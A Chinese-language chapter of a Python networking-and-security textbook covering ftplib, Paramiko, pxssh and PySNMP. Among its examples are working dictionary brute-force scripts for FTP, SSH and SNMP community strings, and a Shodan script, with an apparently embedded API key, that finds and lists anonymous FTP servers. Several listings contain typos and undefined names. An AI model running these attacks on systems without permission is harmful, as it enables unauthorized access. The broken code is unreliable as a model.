# 与FTP、SSH和SNMP服务器交互

本章将帮助您了解允许我们与FTP、SSH和SNMP服务器交互的模块。在本章中，我们将探讨网络中的计算机如何相互交互。一些允许我们连接FTP、SSH和SNMP服务器的工具可以在Python中找到，其中我们可以突出显示FTPLib、Paramiko和PySNMP。

本章将涵盖以下主题：

+   学习和理解FTP协议以及如何使用`ftplib`模块连接FTP服务器

+   学习和理解如何使用Python构建匿名FTP扫描器

+   学习和理解如何使用`Paramiko`模块连接SSH服务器

+   学习和理解如何使用`pxssh`模块连接SSH服务器

+   学习和理解SNMP协议以及如何使用`PySNMP`模块连接SNMP服务器

# 技术要求

本章的示例和源代码可在GitHub存储库的`chapter7`文件夹中找到：

[https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security).

在本章中，示例与Python 3兼容。

本章需要许多第三方软件包和Python模块，如`ftplib`、`Paramiko`、`pxssh`和`PySNMP`。您可以使用操作系统的软件包管理工具进行安装。以下是在Ubuntu Linux操作系统中使用Python 3安装这些模块的快速方法。我们可以使用以下`pip3`和`easy_install3`命令：

+   `sudo apt-get install python3`

+   `sudo [pip3|easy_install3] ftplib`

+   `sudo [pip3|easy_install3] paramiko`

+   `sudo [pip3|easy_install3] pysnmp`

# 连接FTP服务器

在本节中，我们将回顾Python标准库的`ftplib`模块，该模块为我们提供了创建FTP客户端所需的方法。

# 文件传输协议（FTP）

FTP是一种用于在系统之间传输数据的协议，使用传输控制协议（TCP）端口`21`，允许在同一网络中连接的客户端和服务器交换文件。协议设计的方式定义了客户端和服务器不必在同一平台上运行；任何客户端和任何FTP服务器都可以使用不同的操作系统，并使用协议中定义的原语和命令来传输文件。

该协议专注于为客户端和服务器提供可接受的文件传输速度，但并未考虑诸如安全性之类的更重要概念。该协议的缺点是信息以明文形式传输，包括客户端在服务器上进行身份验证时的访问凭据。

# Python ftplib模块

要了解有关`ftplib`模块的更多信息，可以查询官方文档：

[http://docs.python.org/library/ftplib.html](http://docs.python.org/library/ftplib.html)

`ftplib`是Python中的本地库，允许连接FTP服务器并在这些服务器上执行命令。它旨在使用少量代码创建FTP客户端并执行管理服务器例程。

它可用于创建自动化某些任务的脚本或对FTP服务器执行字典攻击。此外，它支持使用`FTP_TLS`类中定义的实用程序进行TLS加密连接。

在此屏幕截图中，我们可以看到在`ftplib`模块上执行`help`命令：

![](assets/d2ef454e-b939-44a7-8452-1ba78b959c30.png)

# 使用FTP传输文件

ftplib可用于将文件传输到远程计算机并从远程计算机传输文件。FTP类的构造方法（`method __init __（）`）接收`host`、`user`和`key`作为参数，因此在任何实例中传递这些参数到FTP时，可以节省使用connect方法（`host`、`port`、`timeout`）和登录（`user`、`password`）。

在这个截图中，我们可以看到更多关于`FTP`类和`init`方法构造函数的参数的信息：

![](assets/e3b5caed-940e-4d0b-8a59-9857396b050b.png)

要连接，我们可以通过几种方式来实现。第一种是使用`connect()`方法，另一种是通过FTP类构造函数。

![](assets/4cecdc59-f643-40d2-8597-d1e69d152ae6.png)

在这个脚本中，我们可以看到如何连接到一个`ftp`服务器：

```py
from ftplib import FTP
server=''
# Connect with the connect() and login() methods
ftp = FTP()
ftp.connect(server, 21)
ftp.login(‘user’, ‘password’)
# Connect in the instance to FTP
ftp_client = FTP(server, 'user', 'password')
```

`FTP()`类以远程服务器、`ftp`用户的用户名和密码作为参数。

在这个例子中，我们连接到一个FTP服务器，以从`ftp.be.debian.org`服务器下载一个二进制文件。

在以下脚本中，我们可以看到如何连接到一个**匿名**FTP服务器并下载二进制文件，而无需用户名和密码。

你可以在文件名为`ftp_download_file.py`中找到以下代码：

```py
#!/usr/bin/env python
import ftplib
FTP_SERVER_URL = 'ftp.be.debian.org'
DOWNLOAD_DIR_PATH = '/pub/linux/network/wireless/'
DOWNLOAD_FILE_NAME = 'iwd-0.3.tar.gz'

def ftp_file_download(path, username):
    # open ftp connection
    ftp_client = ftplib.FTP(path, username)
    # list the files in the download directory
    ftp_client.cwd(DOWNLOAD_DIR_PATH)
    print("File list at %s:" %path)
    files = ftp_client.dir()
    print(files)
    # download a file
    file_handler = open(DOWNLOAD_FILE_NAME, 'wb')
    ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME
    ftp_client.retrbinary(ftp_cmd,file_handler.write)
    file_handler.close()
    qftp_client.quit()

if __name__ == '__main__':
    ftp_file_download(path=FTP_SERVER_URL,username='anonymous')
```

# 使用ftplib来暴力破解FTP用户凭据

这个库的主要用途之一是检查FTP服务器是否容易受到使用字典的暴力攻击。例如，使用这个脚本，我们可以对FTP服务器执行使用用户和密码字典的攻击。我们测试所有可能的用户和密码组合，直到找到正确的组合。

当连接时，如果我们得到"`230 Login successful`"字符串作为答复，我们就会知道这个组合是一个好的组合。

你可以在文件名为`ftp_brute_force.py`中找到以下代码：

```py
import ftplib
import sys

def brute_force(ip,users_file,passwords_file):
    try:
        ud=open(users_file,"r")
        pd=open(passwords_file,"r")

        users= ud.readlines()
        passwords= pd.readlines()

        for user in users:
            for password in passwords:
                try:
                    print("[*] Trying to connect")
                    connect=ftplib.FTP(ip)
                    response=connect.login(user.strip(),password.strip())
                    print(response)
                    if "230 Login" in response:
                        print("[*]Sucessful attack")
                        print("User: "+ user + "Password: "+password)
                        sys.exit()
                    else:
                        pass
                except ftplib.error_perm:
                    print("Cant Brute Force with user "+user+ "and password "+password)
                connect.close

    except(KeyboardInterrupt):
         print("Interrupted!")
         sys.exit()

ip=input("Enter FTP SERVER:")
user_file="users.txt"
passwords_file="passwords.txt"
brute_force(ip,user_file,passwords_file)
```

# 使用Python构建匿名FTP扫描器

我们可以使用`ftplib`模块来构建一个脚本，以确定服务器是否提供匿名登录。

函数`anonymousLogin()`以主机名为参数，并返回描述匿名登录可用性的布尔值。该函数尝试使用匿名凭据创建FTP连接。如果成功，它返回值"`True`"。

你可以在文件名为`checkFTPanonymousLogin.py`中找到以下代码：

```py
import ftplib

def anonymousLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', '')
        print(ftp.getwelcome())
        ftp.set_pasv(1)
        print(ftp.dir())        
        print('\n[*] ' + str(hostname) +' FTP Anonymous Logon Succeeded.')
        return ftp
    except Exception as e:
        print(str(e))
        print('\n[-] ' + str(hostname) +' FTP Anonymous Logon Failed.')
        return False
```

在这个截图中，我们可以看到在允许**匿名登录**的服务器上执行前面的脚本的示例：

![](assets/8d8e37da-5b27-489a-a1ce-99005c35ff2b.png)

在这个例子中，`ftplib`模块被用来访问FTP服务器。在这个例子中，已经创建了一个脚本，其中使用**shodan**来提取允许匿名身份验证的FTP服务器列表，然后使用ftplib来获取根目录的内容。

你可以在文件名为`ftp_list_anonymous_shodan.py`中找到以下代码：

```py
import ftplib
import shodan
import socket
ips =[]

shodanKeyString = 'v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik'
shodanApi = shodan.Shodan(shodanKeyString)
results = shodanApi.search("port: 21 Anonymous user logged in")

for match in results['matches']:
 if match['ip_str'] is not None:
     ips.append(match['ip_str'])

print("Sites found: %s" %len(ips))

for ip in ips:
    try:
        print(ip)
        #server_name = socket.gethostbyaddr(str(ip))
        server_name = socket.getfqdn(str(ip))
        print("Connecting to ip: " +ip+ " / Server name:" + server_name[0])
        ftp = ftplib.FTP(ip)
        ftp.login()
        print("Connection to server_name %s" %server_name[0])
        print(ftp.retrlines('LIST'))
        ftp.quit()
        print("Existing to server_name %s" %server_name[0])
    except Exception as e:
        print(str(e))
        print("Error in listing %s" %server_name[0])
```

# 连接到SSH服务器

在本节中，我们将回顾Paramiko和`pxssh`模块，这些模块为我们提供了创建SSH客户端所需的方法。

# 安全外壳（SSH）协议

SSH已经成为执行两台计算机之间的安全数据通信的非常流行的网络协议。通信中的双方都使用SSH密钥对来加密他们的通信。每个密钥对都有一个私钥和一个公钥。公钥可以发布给任何对其感兴趣的人。私钥始终保持私密，并且除了密钥的所有者之外，对所有人都是安全的。

公钥和私钥可以由认证机构（CA）生成并进行数字签名。这些密钥也可以使用命令行工具生成，例如`ssh-keygen`。

当SSH客户端安全连接到服务器时，它会在一个特殊的文件中注册服务器的公钥，该文件以一种隐藏的方式存储，称为`/.ssh/known_hosts`文件。如果在服务器端，访问必须限制在具有特定IP地址的某些客户端，那么允许主机的公钥可以存储在另一个特殊文件中，称为`ssh_known_hosts`。

# Paramiko简介

Paramiko是一个用Python编写的库，支持SSHV1和SSHV2协议，允许创建客户端并连接到SSH服务器。它依赖于**PyCrypto**和**cryptography**库进行所有加密操作，并允许创建本地，远程和动态加密隧道。

在此库的主要优势中，我们可以强调：

+   它以舒适且易于理解的方式封装了针对SSH服务器执行自动化脚本所涉及的困难，适用于任何程序员

+   它通过`PyCrypto`库支持SSH2协议，该库使用它来实现公钥和私钥加密的所有细节

+   它允许通过公钥进行身份验证，通过密码进行身份验证，并创建SSH隧道

+   它允许我们编写强大的SSH客户端，具有与其他SSH客户端（如Putty或OpenSSH-Client）相同的功能

+   它支持使用SFTP协议安全地传输文件

您可能还对使用基于Paramiko的`pysftp`模块感兴趣。有关此软件包的更多详细信息，请访问PyPI：[https://pypi.python.org/pypi/pysftp.](https://pypi.python.org/pypi/pysftp)

# 安装Paramiko

您可以直接从pip Python存储库安装Paramiko，使用经典命令：`pip install paramiko`。您可以在Python 2.4和3.4+中安装它，并且必须在系统上安装一些依赖项，例如`PyCrypto`和`Cryptography`模块，具体取决于您要安装的版本。这些库为SSH协议提供了基于C的低级加密算法。在官方文档中，您可以看到如何安装它以及不同的可用版本：

[http://www.paramiko.org](http://www.paramiko.org)

有关Cryptography的安装详细信息，请访问：

[https://cryptography.io/en/latest/installation](https://cryptography.io/en/latest/installation)

# 使用Paramiko建立SSH连接

我们可以使用`Paramiko`模块创建SSH客户端，然后将其连接到SSH服务器。此模块将提供`SSHClient()`类，该类提供了一种安全启动服务器连接的接口。这些说明将创建一个新的SSHClient实例，并通过调用`connect()`方法连接到SSH服务器：

```py
import paramiko
ssh_client = paramiko.SSHClient()
ssh_client.connect(‘host’,username='username', password='password')
```

默认情况下，此客户端类的`SSHClient`实例将拒绝连接到没有在我们的`known_hosts`文件中保存密钥的主机。使用`AutoAddPolicy()`类，您可以设置接受未知主机密钥的策略。现在，您需要在`ssh_client`对象上运行`set_missing_host_key_policy()`方法以及以下参数。

通过此指令，Paramiko会自动将远程服务器的指纹添加到操作系统的主机文件中。现在，由于我们正在执行自动化，我们将通知Paramiko首次接受这些密钥，而不会中断会话或提示用户。这将通过`client.set_missing_host_key_policy`，然后`AutoAddPolicy()`完成：

```py
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```

如果您需要仅限于特定主机接受连接，则可以使用`load_system_host_keys()`方法添加系统主机密钥和系统指纹：

```py
ssh_client.load_system_host_keys()
```

连接到SSH服务器的另一种方法是通过`Transport()`方法，它提供了另一种类型的对象来对服务器进行身份验证：

```py
transport = paramiko.Transport(ip)
try:
    transport.start_client()
except Exception as e:
    print(str(e))
try:
    transport.auth_password(username=user,password=passwd)
except Exception as e:
    print(str(e))

if transport.is_authenticated():
    print("Password found " + passwd)
```

我们可以查询`transport`子模块帮助以查看我们可以调用的方法，以连接并获取有关SSH服务器的更多信息：

![](assets/c067aa76-5003-4dab-9d30-69fc7217121e.png)

这是用于验证用户和密码的方法：

![](assets/c00488c6-1363-4ab1-b1f1-32b4d9a8c2a8.png)

`open_session`方法允许我们打开一个新会话以执行命令：

![](assets/552a2b7b-c440-4bfb-a87e-84b0287f967f.png)

# 使用Paramiko运行命令

现在我们使用Paramiko连接到远程主机，我们可以使用这个连接在远程主机上运行命令。要执行命令，我们可以简单地调用`connect()`方法，以及目标`hostname`和SSH登录凭据。要在目标主机上运行任何命令，我们需要调用`exec_command()`方法，并将命令作为参数传递：

```py
ssh_client.connect(hostname, port, username, password)
stdin, stdout, stderr = ssh_client.exec_command(cmd)
for line in stdout.readlines():
    print(line.strip())
ssh.close()
```

以下代码清单显示了如何登录到目标主机，然后运行`ifconfig`命令。下一个脚本将建立到本地主机的SSH连接，然后运行`ifconfig`命令，这样我们就可以看到我们正在连接的机器的网络配置。

使用这个脚本，我们可以创建一个可以自动化许多任务的交互式shell。我们创建了一个名为`ssh_command`的函数，它连接到SSH服务器并运行单个命令。

要执行命令，我们使用`ssh_session`对象的`exec_command()`方法，该对象是在登录到服务器时从打开会话中获得的。

您可以在文件名为`SSH_command.py`的文件中找到以下代码：

```py
#!/usr/bin/env python3
import getpass
import paramiko

HOSTNAME = 'localhost'
PORT = 22

def run_ssh_command(username, password, command, hostname=HOSTNAME, port=PORT):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.load_system_host_keys()
    ssh_client.connect(hostname, port, username, password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        stdin, stdout, stderr = ssh_client.exec_command(command)
        print(stdout.read())
    return

if __name__ == '__main__':
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    command= 'ifconfig'
    run_ssh_command(username, password, command)
```

在这个例子中，我们执行了与上一个脚本相同的功能，但在这种情况下，我们使用`Transport`类与SSH服务器建立连接。要能够执行命令，我们必须在`transport`对象上预先打开一个会话。

您可以在文件名为`SSH_transport.py`的文件中找到以下代码：

```py
import paramiko

def ssh_command(ip, user, passwd, command):
    transport = paramiko.Transport(ip)
    try:
        transport.start_client()
    except Exception as e:
        print(e)

    try:
        transport.auth_password(username=user,password=passwd)
    except Exception as e:
        print(e)

    if transport.is_authenticated():
        print(transport.getpeername())
        channel = transport.opem_session()
        channel.exec_command(command)
        response = channel.recv(1024)
        print('Command %r(%r)-->%s' % (command,user,response))

if __name__ == '__main__':
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    command= 'ifconfig'
    run_ssh_command('localhost',username, password, command)
```

# 使用暴力破解处理进行SSH连接

在这个例子中，我们执行了一个**SSHConnection**类，它允许我们初始化`SSHClient`对象并实现以下方法：

+   `def ssh_connect (self, ip_address, user, password, code = 0)`

+   `def startSSHBruteForce (self, host)`

第一个方法尝试连接到特定IP地址，参数是用户名和密码。

第二个方法接受两个读取文件作为输入（`users.txt`，`passwords.txt`），并通过暴力破解过程，尝试测试从文件中读取的所有可能的用户和密码组合。我们尝试用户名和密码的组合，如果可以建立连接，我们就从已连接的服务器的控制台执行命令。

请注意，如果我们遇到连接错误，我们有一个异常块，在那里我们执行不同的处理，具体取决于连接失败是由于身份验证错误（`paramiko.AuthenticationException`）还是与服务器的连接错误（`socket.error`）。

与用户和密码相关的文件是简单的纯文本文件，包含数据库和操作系统的常见默认用户和密码。文件的示例可以在fuzzdb项目中找到：

[https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd](https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd)

您可以在文件名为`SSHConnection_brute_force.py`的文件中找到以下代码：

```py
import paramiko

class SSHConnection:

    def __init__(self):
        #ssh connection with paramiko library
        self.ssh = paramiko.SSHClient()

    def ssh_connect(self,ip,user,password,code=0): self.ssh.load_system_host_keys()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("[*] Testing user and password from dictionary")
        print("[*] User: %s" %(user))
        print("[*] Pass :%s" %(password))
        try:
            self.ssh.connect(ip,port=22,username=user,password=password,timeout=5)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error as e:
            code = 2
            self.ssh.close()
        return code
```

对于暴力破解过程，我们可以定义一个函数，该函数迭代用户和密码文件，并尝试为每个组合建立`ssh`连接：

```py
 def startSSHBruteForce(self,host): try:
            #open files dictionary
            users_file = open("users.txt")
            passwords_file = open("passwords.txt")
            for user in users_file.readlines():
                for password in passwords_file.readlines():
                    user_text = user.strip("\n")
                    password_text = password.strip("\n")
                    try:
                    #check connection with user and password
                        response = self.ssh_connect(host,user_text,password_text)
                        if response == 0:
                            print("[*] User: %s [*] Pass Found:%s" %(user_text,password_text))
                            stdin,stdout,stderr = self.ssh.exec_command("ifconfig")
                            for line in stdout.readlines():
                                print(line.strip())
                            sys.exit(0)
                        elif response == 1:
                            print("[*]Login incorrect")
                        elif response == 2:
                            print("[*] Connection could not be established to %s" %(host))
                            sys.exit(2)
                except Exception as e:
                    print("Error ssh connection")
                    pass
            #close files
            users_file.close()
            passwords_file.close()
        except Exception as e:
            print("users.txt /passwords.txt Not found")
            pass
```

# 使用pxssh进行SSH连接

`pxssh`是一个基于Pexpect的Python模块，用于建立SSH连接。它的类扩展了`pexpect.spawn`，以专门设置SSH连接。

`pxssh`是一个专门的模块，提供了特定的方法来直接与SSH会话交互，比如`login()`，`logout()`和`prompt()`。

**pxssh文档**

我们可以在`readthedocs`网站上找到`Pexpect`模块的官方文档，网址为[http://pexpect.readthedocs.io/en/stable/api/pxssh.html.](https://pexpect.readthedocs.io/en/stable/index.html)

此外，我们可以使用Python终端的`help`命令获取更多信息：

```py
 import pxssh
 help(pxssh)
```

# 在远程SSH服务器上运行命令

这个例子导入了**getpass**模块，它将提示主机、用户和密码，建立连接，并在远程服务器上运行一些命令。

您可以在文件名`pxsshConnection.py`中找到以下代码：

```py
import pxssh
import getpass

try: 
    connection = pxssh.pxssh()
    hostname = input('hostname: ')
    username = input('username: ')
    password = getpass.getpass('password: ')
    connection.login (hostname, username, password)
    connection.sendline ('ls -l')
    connection.prompt()
    print(connection.before)
    connection.sendline ('df')
    connection.prompt()
    print(connection.before)
    connection.logout()
except pxssh.ExceptionPxssh as e:
    print("pxssh failed on login.")
    print(str(e))
```

我们可以创建特定的方法来建立`连接`和`发送`命令。

您可以在文件名`pxsshCommand.py`中找到以下代码：

```py
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pxssh

hostname = 'localhost'
user = 'user'
password = 'password'
command = 'df -h'

def send_command(ssh_session, command):
    ssh_session.sendline(command)
    ssh_session.prompt()
    print(ssh_session.before)

def connect(hostname, username, password):
 try:
     s = pxssh.pxssh()
     if not s.login(hostname, username, password):
         print("SSH session failed on login.")
     return s
 except pxssh.ExceptionPxssh as e:
     print('[-] Error Connecting')
     print(str(e))

def main():
    session = connect(host, user, password)
    send_command(session, command)
    session.logout()

if __name__ == '__main__':
    main()
```

# 与SNMP服务器连接

在本节中，我们将回顾PySNMP模块，该模块为我们提供了与SNMP服务器轻松连接所需的方法。

# 简单网络管理协议（SNMP）

SMNP是一种基于用户数据报协议（UDP）的网络协议，主要用于路由器、交换机、服务器和虚拟主机的管理和网络设备监视。它允许设备配置、性能数据和用于控制设备的命令的通信。

SMNP基于将可监视的设备分组的社区的定义，旨在简化网络段中机器的监视。操作很简单，网络管理器向设备发送GET和SET请求，带有SNMP代理的设备根据请求提供信息。

关于**安全性**，SNMP协议根据协议版本号提供多种安全级别。在SNMPv1和v2c中，数据受到称为社区字符串的密码保护。在SNMPv3中，需要用户名和密码来存储数据。

SNMP协议的主要元素是：

+   **SNMP管理器**：它的工作原理类似于监视器。它向一个或多个代理发送查询并接收答复。根据社区的特性，它还允许编辑我们正在监视的机器上的值。

+   **SNMP代理**：属于某个社区并且可以由SNMP管理器管理的任何类型的设备。

+   **SNMP社区**：表示代理的分组的文本字符串。

+   **管理信息库（MIB）**：形成可以针对SNMP代理进行的查询的基础的信息单元。它类似于数据库信息，其中存储了每个设备的信息。MIB使用包含对象标识符（OID）的分层命名空间。

+   **对象标识符（OID）**：表示可以读取并反馈给请求者的信息。用户需要知道OID以查询数据。

# PySNMP

在Python中，您可以使用名为PySNMP的第三方库与**snmp守护程序**进行接口。

您可以使用以下`pip`命令安装PySNMP模块：

`$ pip install pysnmp`

在此截图中，我们可以看到我们需要为此模块安装的依赖项：

![](assets/100106a6-418e-4716-910b-e5d82c447a55.png)

我们可以看到，安装PySNMP需要`pyasn1`包。ASN.1是一种标准和符号，用于描述在电信和计算机网络中表示、编码、传输和解码数据的规则和结构。

pyasn1可在PyPI存储库中找到：[https://pypi.org/project/pyasn1/](https://pypi.org/project/pyasn1)。在GitHub存储库[https://github.com/etingof/pyasn1](https://github.com/etingof/pyasn1)中，我们可以看到如何使用此模块与SNMP服务器交互时获取记录信息。

对于此模块，我们可以在以下页面找到官方文档：

[http://pysnmp.sourceforge.net/quick-start.html](http://pysnmp.sourceforge.net/quick-start.html)

执行SNMP查询的主要模块如下：

`pysnmp.entity.rfc3413.oneliner.cmdgen`

这里是允许您查询SNMP服务器的`CommandGenerator`类：

![](assets/00c60189-fa6a-4a87-8098-2cc76611c06a.png)

在此代码中，我们可以看到`CommandGenerator`类的基本用法：

```py
from pysnmp.entity.rfc3413.oneliner import cmdgen 
cmdGen = cmdgen.CommandGenerator()
cisco_contact_info_oid = "1.3.6.1.4.1.9.2.1.61.0"
```

我们可以使用`getCmd()`方法执行SNMP。结果被解包成各种变量。这个命令的输出包括一个四值元组。其中三个与命令生成器返回的错误有关，第四个（`varBinds`）与绑定返回数据的实际变量有关，并包含查询结果：

```py
errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(cmdgen.CommunityData('secret'),
cmdgen.UdpTransportTarget(('172.16.1.189', 161)),
cisco_contact_info_oid)

for name, val in varBinds:
    print('%s = %s' % (name.prettyPrint(), str(val)))
```

你可以看到**cmdgen**接受以下**参数**：

+   **CommunityData():** 将community字符串设置为public。

+   **UdpTransportTarget():** 这是主机目标，SNMP代理正在运行的地方。这是指定主机名和UDP端口的配对。

+   **MibVariable:** 这是一个值元组，包括MIB版本号和MIB目标字符串（在本例中是`sysDescr`；这是指系统的描述）。

在这些例子中，我们看到一些脚本的目标是**获取远程SNMP代理的数据**。

你可以在文件名为`snmp_example1.py`中找到以下代码：

```py
from pysnmp.hlapi import *

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161
SNMP_COMMUNITY = 'public'

errorIndication, errorStatus, errorIndex, varBinds = next(
 getCmd(SnmpEngine(),
 CommunityData(SNMP_COMMUNITY, mpModel=0),
 UdpTransportTarget((SNMP_HOST, SNMP_PORT)),
 ContextData(),
 ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)))
)
if errorIndication:
    print(errorIndication)
elif errorStatus:
    print('%s at %s' % (errorStatus.prettyPrint(),errorIndex and varBinds[int(errorIndex)-1][0] or '?'))
else:
    for varBind in varBinds:
        print(' = '.join([ x.prettyPrint() for x in varBind ]))
```

如果我们尝试执行先前的脚本，我们会看到已注册的SNMP代理的公共数据：

![](assets/2dbc8623-071f-4a68-8948-6d7f9f10b426.png)

你可以在文件名为`snmp_example2.py`中找到以下代码：

```py
from snmp_helper import snmp_get_oid,snmp_extract

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161

SNMP_COMMUNITY = 'public'
a_device = (SNMP_HOST, SNMP_COMMUNITY , SNMP_PORT)
snmp_data = snmp_get_oid(a_device, oid='.1.3.6.1.2.1.1.1.0',display_errors=True)
print(snmp_data)

if snmp_data is not None:
    output = snmp_extract(snmp_data)
    print(output)
```

如果我们尝试执行先前的脚本，我们会看到已注册的SNMP代理的公共数据：

![](assets/1c0ec4d8-545b-4dc6-aef6-d0b856801159.png)

你可以在文件名为`snmp_example3.py`中找到以下代码：

```py
from pysnmp.entity.rfc3413.oneliner import cmdgen

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161
SNMP_COMMUNITY = 'public'

snmpCmdGen = cmdgen.CommandGenerator()
snmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST ,SNMP_PORT ))

error,errorStatus,errorIndex,binds = snmpCmdGen
getCmd(cmdgen.CommunityData(SNMP_COMMUNITY),snmpTransportData,"1.3.6.1.2.1.1.1.0","1.3.6.1.2.1.1.3.0","1.3.6.1.2.1.2.1.0")

if error:
    print("Error"+error)
else:
    if errorStatus:
        print('%s at %s' %(errorStatus.prettyPrint(),errorIndex and  binds[int(errorIndex)-1] or '?'))
    else:
        for name,val in binds:
            print('%s = %s' % (name.prettyPrint(),val.prettyPrint()))
```

如果我们尝试执行先前的脚本，我们会看到已注册的SNMP代理的公共数据：

![](assets/bcc8af0d-d614-4382-9daa-89e59139e964.png)

在这个例子中，我们尝试为特定的SNMP服务器查找community。为此任务，我们首先从fuzzdb获取包含可用community列表的文件`wordlist-common-snmp-community-strings.txt`：

[https://github.com/fuzzdb-project/fuzzdb/blob/master/wordlists-misc/wordlist-common-snmp-community-strings.txt](https://github.com/fuzzdb-project/fuzzdb/blob/master/wordlists-misc/wordlist-common-snmp-community-strings.txt)

你可以在文件名为`snmp_brute_force.py`中找到以下代码：

```py
from pysnmp.entity.rfc3413.oneliner import cmdgen

SNMP_HOST = '182.16.190.78'
SNMP_PORT = 161

cmdGen = cmdgen.CommandGenerator()
fd = open("wordlist-common-snmp-community-strings.txt")
for community in fd.readlines():
    snmpCmdGen = cmdgen.CommandGenerator()
    snmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST, SNMP_PORT),timeout=1.5,retries=0)

    error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, "1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.3.0", "1.3.6.1.2.1.2.1.0")
    # Check for errors and print out results
    if error:
        print(str(error)+" For community: %s " %(community))
    else:
        print("Community Found '%s' ... exiting." %(community))
        break
```

要获取服务器和SNMP代理，我们可以在Shodan中使用SNMP协议和端口`161`进行搜索，然后获得以下结果：

![](assets/f5f7f1fe-e4fd-4ced-8d3f-5fd6802d5712.png)

一个有趣的工具，用于检查与SNMP服务器的连接并获取SNMP变量的值，是`snmp-get`，它适用于Windows和Unix环境：

[https://snmpsoft.com/shell-tools/snmp-get/](https://snmpsoft.com/shell-tools/snmp-get/)

使用Windows的**SnmpGet**，我们可以获取有关SNMP服务器的信息。

在下面的截图中，我们可以看到这个工具的命令行参数。

![](assets/3bbda7d1-2b15-454b-854c-ab28b72cb10c.png)

此外，Ubuntu操作系统也有类似的工具：

[http://manpages.ubuntu.com/manpages/bionic/man1/snmpget.1.html](http://manpages.ubuntu.com/manpages/bionic/man1/snmpget.1.html)

# 总结

本章的一个目标是描述允许我们连接到FTP、SSH和SNMP服务器的模块。在本章中，我们遇到了几种网络协议和Python库，用于与远程系统进行交互。此外，我们探讨了如何通过SNMP执行网络监控。我们使用PySNMP模块简化和自动化了我们的SNMP查询。

在下一[章节](ee538860-9660-4043-9296-143e62f27a61.xhtml)中，我们将探索用于与Nmap扫描仪一起工作的编程包，并获取有关正在运行的服务器上的服务和漏洞的更多信息。

# 问题

1.  使用`connect()`和`login()`方法连接到FTP服务器的ftplib模块的方法是什么？

1.  ftplib模块的哪种方法允许其列出FTP服务器的文件？

1.  Paramiko模块的哪种方法允许我们连接到SSH服务器，以及使用什么参数（主机、用户名、密码）？

1.  Paramiko模块的哪种方法允许我们打开一个会话以便随后执行命令？

1.  使用我们知道其路径和密码的RSA证书登录到SSH服务器的方式是什么？

1.  PySNMP模块的主要类是允许对SNMP代理进行查询的类是什么？

1.  如何通知Paramiko在第一次接受服务器密钥而不中断会话或提示用户的指令是什么？

1.  通过`Transport()`方法连接到SSH服务器的方式是提供另一种对象来对服务器进行身份验证。

1.  基于Paramiko的Python FTP模块是以安全方式与FTP服务器建立连接的模块是什么？

1.  我们需要使用ftplib的哪种方法来下载文件，以及我们需要执行的`ftp`命令是什么？

# 进一步阅读

在这些链接中，您将找到有关提到的工具的更多信息以及用于搜索一些提到的模块的官方Python文档：

+   [http://www.paramiko.org](http://www.paramiko.org)

+   [http://pexpect.readthedocs.io/en/stable/api/pxssh.html](http://pexpect.readthedocs.io/en/stable/api/pxssh.html)

+   [http://pysnmp.sourceforge.net/quick-start.html](http://pysnmp.sourceforge.net/quick-start.html)

对于对如何使用Paramiko创建到远程服务器的隧道感兴趣的读者，可以在PyPI存储库中检查**sshtunnel**模块：[ https://pypi.org/project/sshtunnel/](https://pypi.org/project/sshtunnel/)。

文档和示例可在GitHub存储库中找到：[https://github.com/pahaz/sshtunnel.](https://github.com/pahaz/sshtunnel)
